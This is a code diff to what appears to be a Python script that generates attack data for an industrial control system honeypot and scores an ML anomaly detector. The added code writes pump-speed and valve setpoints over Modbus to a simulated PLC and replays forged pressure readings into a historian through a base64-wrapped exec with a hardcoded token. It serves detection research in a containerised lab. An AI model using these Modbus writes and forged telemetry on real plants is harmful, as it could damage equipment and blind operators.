@@ -14,8 +14,8 @@ Workflow:
 6. Enters the 30-minute validation split:
    - Run a standard full chain (recon + info + exploit + drift + lateral + privesc + replay)
    - Run a custom Phase 5 (stealth drift)
-7. Enters the 1.5-hour test split:
-   - Repeatedly launches randomized instances of Phase 4, 5, 7, and 8 attacks.
+7. Enters the ~2-hour test split:
+   - 20 randomized attacks (4× Phase 4/5/7, 8× Phase 8) with varied parameters.
 8. Writes all attack boundaries to results/attack_results_extended.csv.
 9. Exports the final data using scripts/save_results.py.
 
@@ -37,10 +37,42 @@ import shlex
 import urllib.request
 import urllib.error
 import argparse
+import threading
 
 
 class CampaignError(Exception):
     """Raised when a campaign step fails and the run must abort."""
+
+
+def trigger_background_checkpoint():
+    """Triggers save_results.py in a background thread to export a checkpoint snapshot without blocking."""
+    def _checkpoint_task():
+        try:
+            current_stop_utc = utc_now_iso()
+            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+            checkpoint_dir = os.path.join(RESULTS_DIR, f"checkpoint_{ts}")
+            log(f"[CHECKPOINT] Starting background checkpoint export to {checkpoint_dir} ...")
+
+            save_script = os.path.join(PROJECT_DIR, "scripts", "save_results.py")
+            cmd = (
+                f"{shlex.quote(EVAL_PYTHON)} {shlex.quote(save_script)} "
+                f"--start {shlex.quote(CAMPAIGN_START_UTC)} "
+                f"--stop {shlex.quote(current_stop_utc)} "
+                f"--out-dir {shlex.quote(checkpoint_dir)}"
+            )
+            res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            if res.returncode == 0:
+                subprocess.run(["cp", ATTACK_CSV, checkpoint_dir + "/"], capture_output=True, text=True)
+                log(f"[CHECKPOINT SUCCESS] Background checkpoint created: {checkpoint_dir}")
+            else:
+                log(f"[CHECKPOINT ERROR] Background checkpoint export failed (exit {res.returncode}):")
+                _log_subprocess_output(res, "CHECKPOINT")
+        except Exception as exc:
+            log(f"[CHECKPOINT ERROR] Exception during background checkpoint: {exc}")
+
+    t = threading.Thread(target=_checkpoint_task, daemon=True)
+    t.start()
+
 
 # ── Config ────────────────────────────────────────────────────────────────────
 PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
@@ -68,13 +100,15 @@ def log(msg):
         f.write(line + "\n")
 
 
+import csv
+
 def record_attack(phase, name, status, detail=""):
     utc_now = datetime.datetime.now(datetime.timezone.utc).strftime(
         "%Y-%m-%dT%H:%M:%S.%fZ"
     )
-    row = f"{utc_now},{phase},{name},{status},{detail}\n"
-    with open(ATTACK_CSV, "a") as f:
-        f.write(row)
+    with open(ATTACK_CSV, "a", newline="") as f:
+        writer = csv.writer(f)
+        writer.writerow([utc_now, phase, name, status, detail])
     log(f"RECORDED: Phase {phase} ({name}) - {status} - {detail}")
 
 
@@ -250,6 +284,29 @@ def save_and_locate_results():
     log(f"Evaluate with: python3 evaluate.py --data-dir {shlex.quote(latest_dir)}")
     return latest_dir
 
+def run_evaluation_metrics(latest_dir):
+    """Runs evaluate.py to calculate precision, recall, and F1-score."""
+    log("=" * 70)
+    log("EVALUATING DETECTION METRICS (Precision, Recall, F1-Score)")
+    log("=" * 70)
+    
+    eval_script = os.path.join(PROJECT_DIR, "evaluate.py")
+    if not os.path.isfile(eval_script):
+        log("[WARNING] evaluate.py not found in project root. Skipping automatic evaluation metrics.")
+        return
+
+    eval_cmd = f"{shlex.quote(EVAL_PYTHON)} {shlex.quote(eval_script)} --data-dir {shlex.quote(latest_dir)}"
+    res = subprocess.run(eval_cmd, shell=True, capture_output=True, text=True)
+    
+    if res.returncode != 0:
+        log("[ERROR] Evaluation script failed.")
+        _log_subprocess_output(res, "EVAL")
+    else:
+        log("Evaluation Results Output:")
+        for line in res.stdout.splitlines():
+            log(f"  {line}")
+            print(line)
+
 
 # ── Shared attack helpers ─────────────────────────────────────────────────────
 MODBUS_HOST = "plc_simulator"
@@ -296,7 +353,28 @@ def run_actuator_hijack(rpm, valve, hold_s):
     run_attacker_cmd(cmd)
 
 
-def run_replay_attack(pressure, count):
+def run_insider_scada_attack(rpm, valve, hold_s):
+    """
+    Phase 9 — SCADA Insider Setpoint Attack.
+    Executed 100% strictly from ics_scada_ssh (Purdue Level 2 SCADA Engineering Workstation)
+    over ot-net (172.24.0.8:502).
+    """
+    cmd = (
+        f"docker exec -t ics_scada_ssh python3 -c \""
+        f"from pymodbus.client import ModbusTcpClient; import time; "
+        f"c = ModbusTcpClient('172.24.0.8', port=502); c.connect(); "
+        f"c.write_register(200, {rpm}); time.sleep(1); "
+        f"c.write_register(201, {valve}); time.sleep({hold_s}); "
+        f"c.write_register(200, 1200); "
+        f"c.write_register(201, 500); c.close()\""
+    )
+    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    if res.returncode != 0:
+        log(f"  [WARN] Phase 9 execution from ics_scada_ssh returned non-zero code {res.returncode}: {res.stderr.strip()}")
+
+
+
+def run_replay_attack(pressure, count, frame_delay_s=0.1):
     import base64
     endpoint = (
         "http://ics_historian:8086/api/v2/write"
@@ -308,7 +386,7 @@ def run_replay_attack(pressure, count):
         f"hdr = {{'Authorization': 'Token supersecrettoken', 'Content-Type': 'text/plain; charset=utf-8'}}\n"
         f"for _ in range({count}):\n"
         f"    requests.post(ep, headers=hdr, data='pipeline_metrics,location=pump_station_01,source=historian_bridge pressure={pressure} ' + str(time.time_ns()), timeout=2)\n"
-        f"    time.sleep(0.1)\n"
+        f"    time.sleep({frame_delay_s})\n"
     )
     b64_script = base64.b64encode(script.encode('utf-8')).decode('utf-8')
     cmd = f"python3 -c \"import base64; exec(base64.b64decode('{b64_script}').decode('utf-8'))\""
@@ -367,18 +445,37 @@ def run_smoke_test():
 
 
 # ── Full 3-hour timeline ──────────────────────────────────────────────────────
-def run_full_campaign():
-    log("=" * 70)
-    log("FULL CAMPAIGN — Phase 1: Baseline (60 minutes)")
-    mark_campaign_start()
-    log("=" * 70)
-    for tick in range(6):
-        time.sleep(600)
-        log(f"  Baseline: {(tick+1)*10}/60 min elapsed")
+def run_full_campaign(
+    skip_baseline=False,
+    n_phase4=6,
+    n_phase5=8,
+    n_phase7=14,
+    n_phase8=10,
+    n_phase9=10,
+    min_quiet_s=380,
+    max_quiet_s=520,
+    checkpoint_interval_s=3600,
+):
+    if skip_baseline:
+        log("=" * 70)
+        log("FULL CAMPAIGN — Skipping baseline (reusing existing stack + accumulated normal data)")
+        log("Resetting ML Engine to retrain on accumulated baseline ...")
+        log("=" * 70)
+        reset_ml_engine()
+        log("Waiting 5 min for model fit on accumulated baseline ...")
+        time.sleep(300)
+    else:
+        log("=" * 70)
+        log("FULL CAMPAIGN — Phase 1: Baseline (60 minutes)")
+        mark_campaign_start()
+        log("=" * 70)
+        for tick in range(6):
+            time.sleep(600)
+            log(f"  Baseline: {(tick+1)*10}/60 min elapsed")
 
-    reset_ml_engine()
-    log("Waiting 5 min for model fit ...")
-    time.sleep(300)
+        reset_ml_engine()
+        log("Waiting 5 min for model fit ...")
+        time.sleep(300)
 
     # ── Validation: full kill chain + standalone drift ────────────────────────
     log("=" * 70)
@@ -400,8 +497,28 @@ def run_full_campaign():
         record_attack(phase_num, phase_name, "completed")
         time.sleep(10)
 
-    log("Kill chain done. Waiting 10 min before standalone drift ...")
-    time.sleep(600)
+    log("Kill chain done. Running 1 Phase 9 SCADA Insider Setpoint Attack (validation boost) ...")
+    record_attack(9, "phase9_insider", "started", "Validation — SCADA Insider Setpoint RPM=2800 Valve=0 hold=10s")
+    run_insider_scada_attack(rpm=2800, valve=0, hold_s=10)
+    record_attack(9, "phase9_insider", "completed")
+    time.sleep(10)
+
+    log("Running 2 extra validation replays (Phase 8 boost) ...")
+    for replay_idx in range(2):
+        pressure = random.choice([110.0, 118.0, 122.0, 128.0, 130.0])
+        count = random.choice([100, 175, 225, 275, 300])
+        frame_delay = random.choice([0.08, 0.1, 0.15, 0.2])
+        record_attack(
+            8, "phase8_replay", "started",
+            f"Validation extra {replay_idx + 1}/2 — Replay {pressure} PSI × {count} "
+            f"frames @ {frame_delay}s",
+        )
+        run_replay_attack(pressure=pressure, count=count, frame_delay_s=frame_delay)
+        record_attack(8, "phase8_replay", "completed")
+        time.sleep(30)
+
+    log("Waiting 8 min before standalone drift ...")
+    time.sleep(480)
 
     record_attack(5, "phase5_payload", "started",
                   "Validation Standalone — +3 PSI every 5 s, 10 steps")
@@ -411,58 +528,86 @@ def run_full_campaign():
     log("Validation done. Waiting 8 min to fill window ...")
     time.sleep(480)
 
-    # ── Test: 8 randomised attacks over 90 minutes ───────────────────────────
+    # ── Test: Configurable attack pool (Default ~6 hours, 48 attacks) ───
     log("=" * 70)
-    log("FULL CAMPAIGN — Phase 3: Test (1.5 hours, 8 attacks)")
+    log(
+        f"FULL CAMPAIGN — Phase 3: Test Pool "
+        f"({n_phase4}x Phase 4, {n_phase5}x Phase 5, {n_phase7}x Phase 7, {n_phase8}x Phase 8, {n_phase9}x Phase 9; "
+        f"Quiet interval: {min_quiet_s}-{max_quiet_s}s)"
+    )
     log("=" * 70)
 
-    attack_pool = [
-        {"phase": 4, "name": "phase4_exploit",    "desc": "Semantic Injection"},
-        {"phase": 5, "name": "phase5_payload",     "desc": "Stealth Drift"},
-        {"phase": 7, "name": "phase7_privesc",     "desc": "Actuator Manipulation"},
-        {"phase": 8, "name": "phase8_replay",      "desc": "Replay Attack"},
-    ] * 2
+    attack_pool = (
+        [{"phase": 4, "name": "phase4_exploit", "desc": "Semantic Injection"}] * n_phase4
+        + [{"phase": 5, "name": "phase5_payload", "desc": "Stealth Drift"}] * n_phase5
+        + [{"phase": 7, "name": "phase7_privesc", "desc": "Actuator Manipulation"}] * n_phase7
+        + [{"phase": 8, "name": "phase8_replay", "desc": "Replay Attack"}] * n_phase8
+        + [{"phase": 9, "name": "phase9_insider", "desc": "SCADA Insider Setpoint Attack"}] * n_phase9
+    )
     random.shuffle(attack_pool)
+    total_test_attacks = len(attack_pool)
+
+    last_checkpoint_time = time.monotonic()
 
     for idx, attack in enumerate(attack_pool):
-        interval = random.randint(420, 600)
-        log(f"Quiet interval before attack {idx+1}/8: {interval} s ...")
+        # Check if periodic safety checkpoint is due
+        if time.monotonic() - last_checkpoint_time >= checkpoint_interval_s:
+            log(f"Hourly safety checkpoint due (>{checkpoint_interval_s}s since last export) — triggering background export...")
+            trigger_background_checkpoint()
+            last_checkpoint_time = time.monotonic()
+
+        interval = random.randint(min_quiet_s, max_quiet_s)
+        log(f"Quiet interval before attack {idx+1}/{total_test_attacks}: {interval} s ...")
         time.sleep(interval)
 
-        log(f"--- Test Attack {idx+1}/8: {attack['desc']} ---")
+        log(f"--- Test Attack {idx+1}/{total_test_attacks}: {attack['desc']} ---")
 
         if attack["phase"] == 4:
-            p = random.choice([310, 330, 360, 400])
+            p = random.choice([300, 310, 330, 345, 360, 375, 400, 420])
             record_attack(4, "phase4_exploit", "started",
                           f"Test Solo — Injection {p} PSI")
             run_attacker_cmd(_pymodbus_write(100, p))
             record_attack(4, "phase4_exploit", "completed")
 
         elif attack["phase"] == 5:
-            step  = random.choice([2, 3, 4])
-            delay = random.choice([3, 4, 5])
-            steps = random.choice([10, 12, 14])
+            step  = random.choice([2, 3, 4, 5])
+            delay = random.choice([3, 4, 5, 6])
+            steps = random.choice([8, 10, 12, 14, 16])
             record_attack(5, "phase5_payload", "started",
                           f"Test Solo — Drift +{step} PSI every {delay}s × {steps}")
             run_stealth_drift(step_psi=step, delay_s=delay, num_steps=steps)
             record_attack(5, "phase5_payload", "completed")
 
         elif attack["phase"] == 7:
-            rpm   = random.choice([2600, 2800, 3000])
-            valve = random.choice([0, 100])
-            hold  = random.choice([6, 8, 10])
+            rpm   = random.choice([2400, 2600, 2800, 3000, 3200])
+            valve = random.choice([0, 50, 100, 200])
+            hold  = random.choice([5, 6, 8, 10, 12, 15, 18])
             record_attack(7, "phase7_privesc", "started",
                           f"Test Solo — Actuator RPM={rpm} Valve={valve} hold={hold}s")
             run_actuator_hijack(rpm=rpm, valve=valve, hold_s=hold)
             record_attack(7, "phase7_privesc", "completed")
 
         elif attack["phase"] == 8:
-            pressure = random.choice([115.0, 120.0, 125.0])
-            count    = random.choice([150, 200, 250])
-            record_attack(8, "phase8_replay", "started",
-                          f"Test Solo — Replay {pressure} PSI × {count} frames")
-            run_replay_attack(pressure=pressure, count=count)
+            pressure = random.choice([110.0, 115.0, 118.0, 120.0, 122.0, 125.0, 128.0, 130.0])
+            count    = random.choice([100, 150, 175, 200, 225, 250, 275, 300])
+            frame_delay = random.choice([0.08, 0.1, 0.12, 0.15, 0.2])
+            record_attack(
+                8, "phase8_replay", "started",
+                f"Test Solo — Replay {pressure} PSI × {count} frames @ {frame_delay}s",
+            )
+            run_replay_attack(pressure=pressure, count=count, frame_delay_s=frame_delay)
             record_attack(8, "phase8_replay", "completed")
+
+        elif attack["phase"] == 9:
+            rpm   = random.choice([2800, 2900, 3000, 3100, 3200])
+            valve = random.choice([0, 50, 100])
+            hold  = random.choice([8, 10, 12, 14, 15])
+            record_attack(
+                9, "phase9_insider", "started",
+                f"Test Solo — SCADA Insider Setpoint RPM={rpm} Valve={valve} hold={hold}s",
+            )
+            run_insider_scada_attack(rpm=rpm, valve=valve, hold_s=hold)
+            record_attack(9, "phase9_insider", "completed")
 
     log("All test attacks done. Cooling down 5 min ...")
     time.sleep(300)
@@ -481,6 +626,74 @@ def main():
             "the full 3-hour campaign"
         ),
     )
+    parser.add_argument(
+        "--skip-baseline",
+        action="store_true",
+        help=(
+            "Skip the docker teardown/restart and the 60-min baseline wait. "
+            "Assumes the stack is already running with accumulated normal data. "
+            "Resets the ML model immediately, then runs validation + test attacks."
+        ),
+    )
+    parser.add_argument(
+        "--campaign-start-utc",
+        type=str,
+        default=None,
+        help=(
+            "Override the campaign telemetry window start timestamp (ISO 8601 UTC). "
+            "Use this with --skip-baseline to backdate the window to when the stack "
+            "first started (e.g. '2026-07-23T17:02:59Z'). "
+            "If omitted with --skip-baseline, the start is queried from docker."
+        ),
+    )
+    parser.add_argument(
+        "--n-phase4",
+        type=int,
+        default=6,
+        help="Number of Phase 4 (Semantic Injection) attacks in test pool (default: 6)",
+    )
+    parser.add_argument(
+        "--n-phase5",
+        type=int,
+        default=8,
+        help="Number of Phase 5 (Stealth Drift) attacks in test pool (default: 8)",
+    )
+    parser.add_argument(
+        "--n-phase7",
+        type=int,
+        default=14,
+        help="Number of Phase 7 (Actuator Manipulation) attacks in test pool (default: 14)",
+    )
+    parser.add_argument(
+        "--n-phase8",
+        type=int,
+        default=10,
+        help="Number of Phase 8 (Replay Attack) attacks in test pool (default: 10)",
+    )
+    parser.add_argument(
+        "--n-phase9",
+        type=int,
+        default=10,
+        help="Number of Phase 9 (SCADA Insider Setpoint) attacks in test pool (default: 10)",
+    )
+    parser.add_argument(
+        "--min-quiet-s",
+        type=int,
+        default=380,
+        help="Minimum quiet interval between test attacks in seconds (default: 380)",
+    )
+    parser.add_argument(
+        "--max-quiet-s",
+        type=int,
+        default=520,
+        help="Maximum quiet interval between test attacks in seconds (default: 520)",
+    )
+    parser.add_argument(
+        "--checkpoint-interval-s",
+        type=int,
+        default=3600,
+        help="Interval in seconds between background safety checkpoints (default: 3600)",
+    )
     args = parser.parse_args()
 
     os.chdir(PROJECT_DIR)
@@ -494,31 +707,70 @@ def main():
     with open(ATTACK_CSV, "w") as f:
         f.write("timestamp,phase,phase_name,status,detail\n")
 
-    mode = "SMOKE TEST" if args.smoke_test else "FULL 3-HOUR CAMPAIGN"
+    mode = "SMOKE TEST" if args.smoke_test else ("FULL CAMPAIGN (SKIP-BASELINE)" if getattr(args, 'skip_baseline', False) else "FULL CAMPAIGN")
     log(f"Starting ICS Honeypot Data Generator — Mode: {mode}")
     log(f"Project directory : {PROJECT_DIR}")
 
     try:
-        # Wipe + start stack
-        log("Bringing stack down and wiping volumes ...")
-        run_host_cmd("docker compose down -v")
+        if args.skip_baseline and not args.smoke_test:
+            # Stack is already running — don't wipe it
+            log("--skip-baseline: keeping existing docker stack alive.")
 
-        log("Building and starting all services ...")
-        run_host_cmd("docker compose up --build -d")
+            # Set the campaign start timestamp
+            if args.campaign_start_utc:
+                global CAMPAIGN_START_UTC
+                CAMPAIGN_START_UTC = args.campaign_start_utc
+                log(f"Campaign telemetry window start (override): {CAMPAIGN_START_UTC}")
+            else:
+                # Query docker for when the stack started
+                log("Querying docker for stack start time ...")
+                try:
+                    raw = run_host_cmd(
+                        "docker inspect plc_simulator "
+                        "--format '{{.State.StartedAt}}'"
+                    )
+                    # raw is like '2026-07-23T17:02:49.123456789Z'
+                    CAMPAIGN_START_UTC = raw.strip().split(".")[0] + "Z"
+                    log(f"Campaign telemetry window start (from docker): {CAMPAIGN_START_UTC}")
+                except Exception as e:
+                    log(f"[WARN] Could not query docker start time ({e}); using now.")
+                    mark_campaign_start()
 
-        if not check_live_services():
-            raise CampaignError("Service startup failed — plc_simulator did not become healthy")
+            if not check_live_services():
+                raise CampaignError("Stack health check failed — is the stack running?")
+        else:
+            # Normal path: wipe + start stack
+            log("Bringing stack down and wiping volumes ...")
+            run_host_cmd("docker compose down -v")
+
+            log("Building and starting all services ...")
+            run_host_cmd("docker compose up -d")
+
+            if not check_live_services():
+                raise CampaignError("Service startup failed — plc_simulator did not become healthy")
 
         # Execute campaign
         if args.smoke_test:
             run_smoke_test()
         else:
-            run_full_campaign()
+            run_full_campaign(
+                skip_baseline=getattr(args, 'skip_baseline', False),
+                n_phase4=args.n_phase4,
+                n_phase5=args.n_phase5,
+                n_phase7=args.n_phase7,
+                n_phase8=args.n_phase8,
+                n_phase9=args.n_phase9,
+                min_quiet_s=args.min_quiet_s,
+                max_quiet_s=args.max_quiet_s,
+                checkpoint_interval_s=args.checkpoint_interval_s,
+            )
 
         mark_campaign_end()
 
         # Export + locate results
         latest_dir = save_and_locate_results()
+
+        run_evaluation_metrics(latest_dir)
 
         log("=" * 70)
         log(f"CAMPAIGN COMPLETE ({mode})")
